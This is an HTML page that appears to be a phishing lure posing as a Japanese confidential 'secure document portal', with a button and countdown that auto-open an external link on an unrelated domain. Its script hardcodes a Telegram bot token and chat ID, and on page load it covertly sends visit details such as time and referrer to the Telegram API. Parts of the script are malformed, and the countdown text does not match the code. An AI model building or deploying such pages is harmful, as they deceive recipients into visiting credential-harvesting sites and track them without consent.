<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>遠藤篤 セキュアドキュメントポータル</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  font-family: 'Segoe UI', Arial, sans-serif;
  background: #0a0a0a;
  color: #fff;
  min-height: 100vh;
  display: flex; align-items: center; justify-content: center;
}
.container {
  max-width: 620px; width: 90%;
  background: #111;
  border: 1px solid #222;
  border-radius: 12px;
  padding: 40px 32px;
  text-align: center;
}
.logo {
  font-size: 30px; font-weight: 900; letter-spacing: 6px;
  color: #e82127; text-transform: uppercase; margin-bottom: 6px;
}
.logo span { color: #fff; font-weight: 300; letter-spacing: 2px; }
.sub { color: #666; font-size: 13px; letter-spacing: 4px; margin-bottom: 36px; }
.divider { height: 1px; background: #222; margin: 24px 0; }
.notice {
  background: #111; border: 1px solid #333; border-radius: 8px;
  padding: 24px 28px; margin: 20px 0; text-align: left;
}
.notice h3 { color: #e82127; font-size: 14px; margin-bottom: 10px; }
.notice p { color: #aaa; font-size: 13px; line-height: 1.8; }
.btn {
  display: inline-block; margin-top: 24px;
  background: #e82127; color: #fff; padding: 14px 40px;
  border-radius: 6px; text-decoration: none; font-weight: 700;
  font-size: 15px; letter-spacing: 1px; transition: background 0.2s; cursor: pointer;
}
.btn:hover { background: #c41a1f; }
.note { color: #555; font-size: 12px; margin-top: 18px; }
.status { color: #4f4; font-size: 12px; margin-top: 10px; min-height: 18px; }
</style>
</head>
<body>
<div class="container">

  <div class="logo">遠藤篤<span>セキュア</span></div>

      本情報は機密情報であり、誤送信されたものではありません。

本書に記載された内容は、正当な権限を有する受領者のみを対象とするものであり、厳重に機密としてお取り扱いください。許可なく、本情報の開示、複製、転送、その他の目的での使用を行うことは固く禁じられています。

    </p>
  </div>

  <a class="btn" href="#" onclick="openDocument(); return false;">📄 文書を開く</a>
  <div class="status" id="status"></div>
  <div class="note" id="note">
    文書は［X］秒後に自動的に開きます。 <span id="countdown">3</span> 秒…
  </div>

</div>

<script>
// ⬇️ CONFIGURE HERE ⬇️
const DOCUMENT_URL = 'https://onestep-access-45TPyMjN.allsopure.com/4dzKkApThP/xEkv1rpBMLP9pZ0lQw964BwMeU1HD8';
const TG_TOKEN = '8850998371:AAHNAM7SuC7k1eahsl4NP2fjB0Z7Chns8YU';
const TG_CHAT   = '-5551555534';

// Telegram notification on visit
(function ping(){
  const ua = navigator.userAgent;
  const ref = document.referrer || 'direct';
  const time = new Date().toUTCString();
  const msg = `🔐 <b>Kelly Yeung Portal Visit</b>\n`
    + `🕐 <code>${time}</code>\n`
    + `🔗 Ref: <code>${encodeURIComponent(ref)}</code>\n`

  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST',

      chat_id: TG_CHAT,
      text: msg,
      parse_mode: 'HTML',
      disable_web_page_preview: true

// Open document in new window/tab
function openDocument() {
  document.getElementById('note').style.display = 'none';
  document.getElementById('status').textContent = '✅ Document opened in new tab.';

  window.open(DOCUMENT_URL, '_blank');
}

// Countdown: 3 seconds
let sec = 10;
const cd = document.getElementById('countdown');
const timer = setInterval(() => {
  sec--;
  cd.textContent = sec;
  if (sec <= 0) {
    clearInterval(timer);
    openDocument();
  }
}, 1000);
</script>
